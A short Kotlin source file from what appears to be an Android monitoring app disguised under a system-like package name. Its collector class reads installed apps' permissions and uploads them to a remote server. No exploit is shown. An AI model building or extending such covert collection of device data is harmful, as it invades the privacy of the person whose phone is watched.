package com.android.services.logs.collectors

import android.content.Context
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerFourApi
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.PermissionMonitor
import com.android.services.util.logVerbose

class AppPermissionsCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    @Throws(Exception::class)
    override fun uploadLogs() {
        logVerbose("${AppConstants.APPS_PERMISSION_TYPE} Preparing for uploading")
        val permissionMonitor = PermissionMonitor(context)
        val appPermissions = permissionMonitor.checkForAppPermissions()
        logVerbose("${AppConstants.APPS_PERMISSION_TYPE} permissions list = $appPermissions")
        val serverHelper = RemoteServerHelper(
            context,
            AppConstants.APPS_PERMISSION_TYPE,
            localDatabaseSource,
            tosApi = tosApi
        )
        serverHelper.upload(appPermissions)
    }
}